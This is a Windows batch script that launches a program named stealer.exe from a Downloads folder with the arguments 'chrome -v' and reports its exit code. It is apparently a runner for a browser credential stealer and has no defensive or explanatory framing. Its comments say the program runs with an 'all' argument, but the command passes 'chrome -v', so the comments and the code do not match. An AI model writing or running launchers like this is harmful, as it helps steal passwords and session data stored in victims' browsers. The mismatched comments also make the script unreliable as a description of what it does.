@echo off
REM Batch script to execute stealer.exe with the "all" argument and display output in the same console

REM Set the working directory to where stealer.exe is located
cd /d "C:\Users\credentials\Downloads"

REM Check if stealer.exe exists
if not exist "stealer.exe" (
    echo [!] ERROR: stealer.exe not found in %CD%
    exit /b 1
)

REM Execute stealer.exe with the "all" argument and display output
echo [*] Running: stealer.exe chrome -v
stealer.exe chrome -v

REM Capture the exit code for reporting
set EXITCODE=%ERRORLEVEL%
echo [*] stealer.exe exited with code %EXITCODE%

REM Optional: Pause to keep the window open if run by double-click
REM pause

exit /b %EXITCODE%